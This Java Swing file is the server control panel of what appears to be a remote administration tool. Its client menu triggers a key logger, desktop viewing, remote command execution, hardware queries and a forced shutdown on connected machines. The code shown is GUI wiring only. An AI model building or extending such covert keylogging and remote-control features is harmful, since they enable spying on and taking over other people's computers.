package Server.GUI;

import Server.ConnectedClient;
import Server.Server;
import Ultils.MessageType;
import Ultils.NetUtils;
import Ultils.Packet;

import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.util.ArrayList;
import java.util.List;

import javax.swing.DefaultListModel;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JList;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.SwingConstants;
import javax.swing.border.EmptyBorder;
import javax.swing.border.LineBorder;


public class GuiMain extends JFrame {

    private JPanel mainPanel;
    private Server parent;
    private JLabel label;
    private DefaultListModel<ConnectedClient> model;

    private JList<ConnectedClient> clientList;
    private int port = 1337; // default port

    public int getPort() {
        return port;
    }

    public GuiMain(Server parent) {
        this.parent = parent;

        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setBounds(100, 100, 668, 448);
        mainPanel = new JPanel();
        mainPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
        setContentPane(mainPanel);
        mainPanel.setLayout(null);

        JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.TOP);
        tabbedPane.setBounds(6, 5, 656, 364);
        mainPanel.add(tabbedPane);

        JScrollPane clients = new JScrollPane();
        tabbedPane.addTab("Clients", null, clients, null);

        model = new DefaultListModel<ConnectedClient>();
        clientList = new JList<ConnectedClient>(model);
        this.popupMenu();
        clients.setViewportView(clientList);

        JPanel infoPanel = new JPanel();
        infoPanel.setBorder(new LineBorder(new Color(0, 0, 0), 1, true));
        infoPanel.setBounds(6, 375, 656, 45);
        mainPanel.add(infoPanel);
        infoPanel.setLayout(null);

        label = new JLabel("Port: -1 | Clients Connected: 0");
        label.setBounds(6, 6, 644, 33);
        label.setHorizontalAlignment(SwingConstants.CENTER);
        infoPanel.add(label);

        setVisible(true);
    }

    public void popupMenu() {
        JPopupMenu jPopupMenu = new JPopupMenu();
        jPopupMenu.add(createAction("Update Client Info", MessageType.CLIENT_INFO));
        jPopupMenu.add(createAction("Hardware Info", MessageType.HARDWARE_INFO, new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                for (ConnectedClient cc: clientList.getSelectedValuesList()) {
                    cc.OpenHardwareInfoView();
                    Packet packet = new Packet();
                    packet.action = MessageType.HARDWARE_INFO.getID();
                    packet.data = new ArrayList<>();
                    packet.data.add("request");
                    System.out.println("Sending cpu info request to client");
                    try {
                        NetUtils.sendMessage(packet, cc.getPrintWriter());
                    } catch (Exception er) {
                        System.out.println("Failed to send cpu info request");
                    }
                }
            }
        }));
        jPopupMenu.add(createAction("Alt F4", MessageType.ALTF4));
        jPopupMenu.add(createAction("Desktop Viewer", MessageType.DESKTOP, new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent arg0) {
                for (ConnectedClient cc : clientList.getSelectedValuesList()) {
                    cc.OpenDesktopView();
                }
            }

        }));
        jPopupMenu.add(createAction("Command", MessageType.COMMAND, new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                for (ConnectedClient cc : clientList.getSelectedValuesList()) {
                    cc.OpenCommandView();
                }
            }
        }));
        jPopupMenu.add(createAction("CPU Usage", MessageType.PERFORMANCE_TRACK, new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                Packet p = new Packet();
                p.action = MessageType.PERFORMANCE_TRACK.getID();
                p.data = new ArrayList<>();
                p.data.add("start");

                for (ConnectedClient cc : clientList.getSelectedValuesList()) {
                    try {
                        NetUtils.sendMessage(p, cc.getPrintWriter());
                    } catch (Exception ex) {
                        System.out.println("Failed to send start tracking packet");
                    }
                    cc.OpenCpuView();
                }
            }
        }));
        jPopupMenu.add(createAction("Key Logger", MessageType.KEYLOGGER, new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent arg0) {
                for (ConnectedClient cc : clientList.getSelectedValuesList()) {
                    cc.OpenKeyLogView();
                }
            }

        }));
        jPopupMenu.add(createAction("Shutdown", MessageType.SHUTDOWN), new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                for (ConnectedClient cc : clientList.getSelectedValuesList()) {
                    cc.SendShutDown(cc.getPrintWriter());
                }
            }
        });

        clientList.addMouseListener(new MouseAdapter() {
            public void mousePressed(MouseEvent e)  {check(e);}
            public void mouseReleased(MouseEvent e) {check(e);}

            public void check(MouseEvent e) {
                if (e.isPopupTrigger()) {
                    clientList.setSelectedIndex(clientList.locationToIndex(e.getPoint()));
                    jPopupMenu.show(clientList, e.getX(), e.getY());
                }
            }
        });

        clientList.setComponentPopupMenu(jPopupMenu);
    }

    public JMenuItem createAction(String name, MessageType action) {
        JMenuItem item = new JMenuItem(name);
        item.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                Packet packet = new Packet();
                packet.action = action.getID();
                for (ConnectedClient cc : clientList.getSelectedValuesList()) {
                    try {
                        NetUtils.sendMessage(packet, cc.getPrintWriter());
                    } catch (Exception e1) {
                        e1.printStackTrace();
                    }
                }
            }
        });
        return item;
    }

    public JMenuItem createAction(String name, MessageType action, ActionListener listener) {
        JMenuItem item = new JMenuItem(name);
        item.addActionListener(listener);
        return item;
    }

    public void updateInfo() {
        label.setText("Port: " + this.port + " | Clients Connected: " + this.parent.getClients().size());
        List<ConnectedClient> list = new ArrayList<ConnectedClient>();
        for(int i = 0; i< this.clientList.getModel().getSize();i++){
            list.add(this.clientList.getModel().getElementAt(i));
        }
        int index = 0;
        for (ConnectedClient c : this.parent.getClients()) {
            if (!list.contains(c)) {
                this.model.add(index, c);
            }
            index++;
        }
        int count = 0;
        for (ConnectedClient c : list) {
            if (!this.parent.getClients().contains(c)) {
                this.model.remove(count);
                continue;
            }
            count++;
        }
    }
}
